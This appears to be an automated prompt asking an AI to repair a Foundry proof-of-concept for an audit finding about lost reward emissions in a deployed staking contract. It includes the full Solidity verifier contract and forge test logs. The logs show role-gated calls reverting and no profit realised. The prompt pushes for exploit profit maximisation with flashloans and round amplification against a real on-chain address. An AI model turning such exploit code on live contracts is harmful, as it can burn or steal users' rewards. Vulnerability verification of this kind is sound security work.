You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Undistributed emissions still consume the farm's lifetime reward budget
- claim: `timeData.totalRewardsSupply` is increased immediately by the full notified amount, but rewards are only minted later as users accrue and claim them. If no one is staked, `rewardPerToken()` returns the old value and `updateReward` advances `lastUpdateTime`, permanently skipping elapsed emissions while leaving the full amount booked against the lifetime cap. `finishFarming()` likewise truncates the period early without refunding undistributed rewards from `totalRewardsSupply`.
- impact: The contract can burn large portions of its lifetime reward budget without ever minting them to users. Campaigns may underpay relative to their announced allocation, and after enough empty or aborted periods `notifyRewardAmount()` starts reverting even though a meaningful share of the reserved rewards was never actually distributed.
- exploit_paths: ["Call `notifyRewardAmount()` while `_totalSupply == 0`.", "Let part or all of the reward period elapse before anyone stakes.", "The first later `stake`, `withdraw`, or `getReward` path runs `updateReward`, which moves `lastUpdateTime` forward while `rewardPerToken()` stays unchanged because supply was zero.", "Those skipped emissions are now unreachable, but the full notified amount still counts toward `totalRewardsSupply`.", "Similarly, call `finishFarming()` before the period ends; the undistributed remainder is no longer earnable, yet it still remains booked against the farm's lifetime reward limit."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingRewardsLike {
    function owner() external view returns (address);
    function rewardsDistribution() external view returns (address);
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function rewardPerToken() external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function notifyRewardAmount(uint256 reward) external;
    function finishFarming() external;
    function getReward() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    // Path-stage notes:
    // 1) `notifyRewardAmount()` is the schedule entrypoint, but it is gated by `onlyRewardsDistribution`.
    //    This verifier attempts the exact call and records the concrete on-chain access result.
    // 2) Time elapsing cannot be manufactured inside a single unprivileged transaction. The verifier instead
    //    checks whether the fork already contains an elapsed empty-supply reward window.
    // 3) `getReward()` is public and still runs `updateReward(msg.sender)` even for a zero-stake caller.
    //    If the farm has `_totalSupply == 0` and an elapsed reward window, this advances `lastUpdateTime`
    //    while `rewardPerToken()` remains unchanged, permanently skipping emissions.
    // 4) `finishFarming()` is owner-only. The verifier attempts the exact call and records the concrete result.
    //    If it is not callable by the deployed verifier on this fork, that path is mechanically infeasible here.

    bool public executed;
    bool public hypothesisValidated;
    bool public profitAchieved;

    address public ownerAtEntry;
    address public rewardsDistributionAtEntry;
    address public stakingTokenAtEntry;
    address public rewardsTokenAtEntry;

    uint32 public periodFinishBefore;
    uint32 public periodFinishAfter;
    uint32 public rewardsDuration;
    uint32 public lastUpdateTimeBefore;
    uint32 public lastUpdateTimeAfter;
    uint96 public totalRewardsSupplyBefore;
    uint96 public totalRewardsSupplyAfter;

    uint256 public rewardRateBefore;
    uint256 public totalSupplyBefore;
    uint256 public attackerStakeBefore;
    uint256 public attackerEarnedBefore;
    uint256 public rewardPerTokenBefore;
    uint256 public rewardPerTokenAfter;
    uint256 public skippedSeconds;
    uint256 public skippedEmissions;
    uint256 public entryRewardBalance;
    uint256 public exitRewardBalance;
    uint256 public bestRoundCount;

    bool public zeroSupplyAtEntry;
    bool public emptyEmissionWindowAtEntry;
    bool public notifyAttempted;
    bool public notifySucceeded;
    bool public publicAdvanceAttempted;
    bool public publicAdvanceSucceeded;
    bool public finishAttempted;
    bool public finishSucceeded;

    string public exploitPathUsed;
    string public infeasibilityReason;
    string public notifyFailureReason;
    string public finishFailureReason;

    address private immutable _PROFIT_TOKEN;
    uint256 private _profitAmount;

    constructor() {
        _PROFIT_TOKEN = EXPECTED_REWARD_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        rewardsTokenAtEntry = farm.rewardsToken();
        stakingTokenAtEntry = farm.stakingToken();
        ownerAtEntry = farm.owner();
        rewardsDistributionAtEntry = farm.rewardsDistribution();
        rewardRateBefore = farm.rewardRate();
        totalSupplyBefore = farm.totalSupply();
        attackerStakeBefore = farm.balanceOf(address(this));
        attackerEarnedBefore = farm.earned(address(this));
        rewardPerTokenBefore = farm.rewardPerToken();
        (periodFinishBefore, rewardsDuration, lastUpdateTimeBefore, totalRewardsSupplyBefore) = farm.timeData();

        zeroSupplyAtEntry = totalSupplyBefore == 0;
        entryRewardBalance = IERC20Like(_PROFIT_TOKEN).balanceOf(address(this));

        uint256 applicableAtEntry = _min(block.timestamp, uint256(periodFinishBefore));
        if (zeroSupplyAtEntry && rewardRateBefore != 0 && applicableAtEntry > uint256(lastUpdateTimeBefore)) {
            emptyEmissionWindowAtEntry = true;
            skippedSeconds = applicableAtEntry - uint256(lastUpdateTimeBefore);
            skippedEmissions = skippedSeconds * rewardRateBefore;
        }

        uint256 bestProfit = 0;
        uint256 bestRounds = 2;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            _runRoundSet(farm, rounds);

            uint256 currentProfit = _currentProfit();
            if (rounds == 2 || currentProfit > bestProfit) {
                bestProfit = currentProfit;
                bestRounds = rounds;
            } else {
                break;
            }
        }

        bestRoundCount = bestRounds;
        exitRewardBalance = IERC20Like(_PROFIT_TOKEN).balanceOf(address(this));
        _profitAmount = bestProfit;
        profitAchieved = bestProfit > 0;

        rewardPerTokenAfter = farm.rewardPerToken();
        (periodFinishAfter, , lastUpdateTimeAfter, totalRewardsSupplyAfter) = farm.timeData();

        hypothesisValidated =
            publicAdvanceSucceeded &&
            emptyEmissionWindowAtEntry &&
            lastUpdateTimeAfter > lastUpdateTimeBefore &&
            rewardPerTokenAfter == rewardPerTokenBefore &&
            totalRewardsSupplyAfter == totalRewardsSupplyBefore &&
            skippedEmissions != 0;

        if (hypothesisValidated) {
            exploitPathUsed =
                "preexisting notifyRewardAmount() period with zero supply -> elapsed emissions -> public getReward() advances lastUpdateTime with unchanged rewardPerToken -> skipped rewards remain booked";
        } else if (notifySucceeded) {
            exploitPathUsed =
                "notifyRewardAmount() from verifier succeeded, but the same transaction cannot also realize the elapsed-time stage";
        } else {
            exploitPathUsed =
                "notifyRewardAmount() while _totalSupply == 0 -> elapsed empty period -> public getReward()/owner-only finishFarming()";
        }

        if (!hypothesisValidated) {
            if (!zeroSupplyAtEntry) {
                infeasibilityReason = "fork entry has non-zero totalSupply, so the empty-supply emission-loss window is absent";
            } else if (!emptyEmissionWindowAtEntry) {
                infeasibilityReason =
                    "fork entry has no elapsed zero-supply reward window; time-dependent skip stage is not currently live";
            } else if (!publicAdvanceSucceeded) {
                infeasibilityReason = "public getReward() did not advance lastUpdateTime on this fork state";
            } else {
                infeasibilityReason = "state change did not preserve booked rewards with unchanged rewardPerToken";
            }
        }

        if (_profitAmount == 0) {
            if (bytes(infeasibilityReason).length == 0) {
                infeasibilityReason =
                    "no positive net attacker profit exists here: the public action only burns future rewards, while scheduling and early-stop legs are role-gated";
            }
        }
    }

    function profitToken() external view returns (address) {
        return _PROFIT_TOKEN;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runRoundSet(IStakingRewardsLike farm, uint256 rounds) internal {
        for (uint256 i = 0; i < rounds; i++) {
            if (emptyEmissionWindowAtEntry) {
                _attemptPublicAdvance(farm);
            }

            if (!notifyAttempted) {
                _attemptNotify(farm);
            }

            if (!finishAttempted) {
                _attemptFinish(farm);
            }
        }
    }

    function _attemptNotify(IStakingRewardsLike farm) internal {
        notifyAttempted = true;

        uint256 reward = rewardsDuration == 0 ? 1 : uint256(rewardsDuration);
        (bool ok, bytes memory data) = TARGET.call(abi.encodeWithSelector(farm.notifyRewardAmount.selector, reward));
        notifySucceeded = ok;
        if (!ok) {
            notifyFailureReason = _decodeRevert(data);
        }
    }

    function _attemptPublicAdvance(IStakingRewardsLike farm) internal {
        publicAdvanceAttempted = true;

        (bool ok,) = TARGET.call(abi.encodeWithSelector(farm.getReward.selector));
        if (ok) {
            (, , uint32 observedLastUpdateTime, ) = farm.timeData();
            publicAdvanceSucceeded = observedLastUpdateTime > lastUpdateTimeBefore;
        }
    }

    function _attemptFinish(IStakingRewardsLike farm) internal {
        finishAttempted = true;

        (bool ok, bytes memory data) = TARGET.call(abi.encodeWithSelector(farm.finishFarming.selector));
        finishSucceeded = ok;
        if (!ok) {
            finishFailureReason = _decodeRevert(data);
        }
    }

    function _currentProfit() internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_PROFIT_TOKEN).balanceOf(address(this));
        return currentBalance > entryRewardBalance ? currentBalance - entryRewardBalance : 0;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted without reason";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; i++) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71 && revertData.length >= 36) {
            return "panic";
        }

        return "call reverted with custom error or unknown data";
    }
}

```

forge stdout (tail):
```
ocal variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 699778)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xAe9aCa5d20F5b139931935378C4489308394ca2C
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 14264

Traces:
  [699778] FlawVerifierTest::testExploit()
    ├─ [486] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [2563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [660050] FlawVerifier::executeOnOpportunity()
    │   ├─ [322] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsToken() [staticcall]
    │   │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    │   ├─ [257] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::stakingToken() [staticcall]
    │   │   └─ ← [Return] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042
    │   ├─ [2422] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::owner() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [2392] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsDistribution() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [2395] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardRate() [staticcall]
    │   │   └─ ← [Return] 238245925925925925 [2.382e17]
    │   ├─ [2359] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::totalSupply() [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [2607] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9935] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::earned(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1234] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardPerToken() [staticcall]
    │   │   └─ ← [Return] 26289064209735317910 [2.628e19]
    │   ├─ [1122] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::timeData() [staticcall]
    │   │   └─ ← [Return] 1650043907 [1.65e9], 2592000 [2.592e6], 1647755998 [1.647e9], 617533440000000000000000 [6.175e23]
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2755] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::notifyRewardAmount(2592000 [2.592e6])
    │   │   └─ ← [Revert] Caller is not RewardsDistributor
    │   ├─ [2765] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::finishFarming()
    │   │   └─ ← [Revert] Ownable: caller is not the owner
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1234] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardPerToken() [staticcall]
    │   │   └─ ← [Return] 26289064209735317910 [2.628e19]
    │   ├─ [1122] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::timeData() [staticcall]
    │   │   └─ ← [Return] 1650043907 [1.65e9], 2592000 [2.592e6], 1647755998 [1.647e9], 617533440000000000000000 [6.175e23]
    │   └─ ← [Stop]
    ├─ [486] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xAe9aCa5d20F5b139931935378C4489308394ca2C)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14421983 [1.442e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 14264 [1.426e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE.finishFarming
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 623.88ms (554.49ms CPU time)

Ran 1 test suite in 646.60ms (623.88ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 699778)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
